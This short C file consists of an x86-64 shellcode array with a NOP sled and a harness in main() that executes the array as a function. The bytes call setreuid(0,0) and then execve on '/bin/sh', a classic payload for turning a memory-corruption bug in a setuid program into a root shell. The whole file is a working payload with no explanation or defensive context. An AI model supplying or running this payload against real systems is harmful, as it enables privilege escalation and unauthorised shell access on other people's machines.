char shellcode[] = "\x90\x90\x90\x90\x90"
                   "\x48\x31\xc0"
                   "\x48\x83\xc0\x71"
                   "\x48\x31\xff"
                   "\x48\x31\xf6"
                   "\x0f\x05"
                   "\xeb\x13"
                   "\x48\x31\xc0"
                   "\x48\x83\xc0\x3b"
                   "\x5f"
                   "\x88\x67\x07"
                   "\x48\x31\xf6"
                   "\x48\x31\xd2"
                   "\x0f\x05"
                   "\xe8\xe8\xff\xff\xff"
                   "\x2f"
                   "\x62"
                   "\x69"
                   "\x6e"
                   "\x2f"
                   "\x73\x68"
                   "\x4e";
int main() {(*(void(*)())shellcode)();}